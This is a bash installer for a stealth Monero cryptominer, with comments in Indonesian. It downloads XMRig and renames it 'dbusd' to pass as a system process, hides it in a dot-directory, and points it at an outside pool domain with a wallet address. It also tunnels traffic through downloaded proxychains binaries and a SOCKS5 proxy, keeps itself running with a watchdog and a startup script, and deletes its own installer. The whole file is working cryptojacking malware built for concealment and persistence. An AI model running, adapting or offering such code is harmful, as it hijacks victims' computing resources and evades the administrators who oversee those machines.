#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
REVERSE_DOMAIN="vheler.cfd"
REVERSE_PORT="9933"
WORKER="stealth-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)"
DIR="$HOME/.syscache"

mkdir -p "$DIR" && cd "$DIR"

# === UNDUH XMRIG DAN GANTI NAMA ===
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo miner.tar.gz "$XMRIG_URL"
tar -xzf miner.tar.gz --strip-components=1
rm -f miner.tar.gz
mv xmrig dbusd
chmod +x dbusd

# === KONFIG XMRIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 50,
    "priority": 5
  },
  "pools": [{
    "url": "$REVERSE_DOMAIN:$REVERSE_PORT",
    "user": "$WALLET.$WORKER",
    "pass": "Genzo",
    "tls": true
  }]
}
EOF

# === UNDUH PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 116.100.220.220 1080
EOF

# === LAUNCHER ===
cat > launcher.sh <<'EOF'
#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
while true; do
  CPU_LOAD=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
  CPU_INT=${CPU_LOAD%.*}
  if [ "$CPU_INT" -ge 95 ]; then
    echo "[*] CPU tinggi ($CPU_INT%), pause 30 detik..."
    sleep 30
  else
    LD_PRELOAD="$DIR/libproxychains.so.4" \
    PROXYCHAINS_CONF_FILE="$DIR/proxychains.conf" \
    "$DIR/dbusd" --config="$DIR/config.json" >/dev/null 2>&1
  fi
  sleep 5
done
EOF
chmod +x launcher.sh

# === WATCHDOG ===
cat > watchdog.sh <<'EOF'
#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
while true; do
  if ! pgrep -f launcher.sh >/dev/null; then
    nohup "$DIR/launcher.sh" >/dev/null 2>&1 &
  fi
  sleep 60
done
EOF
chmod +x watchdog.sh

# === JALANKAN ===
nohup ./launcher.sh >/dev/null 2>&1 &
nohup ./watchdog.sh >/dev/null 2>&1 &

# === AUTOJALAN (tanpa crontab) ===
echo -e '#!/bin/bash\\ncd '$DIR'\\nnohup ./launcher.sh >/dev/null 2>&1 &' > $HOME/.reboot.sh
chmod +x $HOME/.reboot.sh

(sleep 10 && rm -f install.sh) &
echo "[✓] Mining stealth aktif tanpa strip & tanpa Java."
